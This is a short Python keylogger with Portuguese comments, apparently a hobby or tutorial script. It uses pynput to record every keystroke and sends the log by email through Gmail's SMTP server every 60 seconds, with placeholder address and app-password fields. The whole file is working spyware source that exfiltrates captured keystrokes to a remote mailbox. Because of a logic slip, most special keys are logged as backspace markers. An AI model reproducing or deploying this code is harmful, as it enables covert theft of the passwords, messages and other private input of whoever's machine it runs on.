from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

#Configurações de e-mail
EMAIL_ORIGEM = "SEU_EMAIL"
EMAIL_DESTINO= "SEU_EMAIL"
SENHA_EMAIL = "a chave de acesso deverá ser gerada pelo app passwords do google"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo Keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To']= EMAIL_DESTINO
    
        try:
           server = smtplib.SMTP("smtp.gmail.com", 587)
           server.starttls()
           server.login(EMAIL_ORIGEM, SENHA_EMAIL)
           server.send_message(msg)
           server.quit()
        except Exception as e:
            print("Erro ao enviar", e)
    
    log = ""

    #Agendar o envio a cada 60 segundos
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log +=" "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif keyboard.Key.backspace:
            log+="[<]"
        else:
            pass # Ignorar control, shift, etc...

# Inicia o keylogger e o envio automático
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()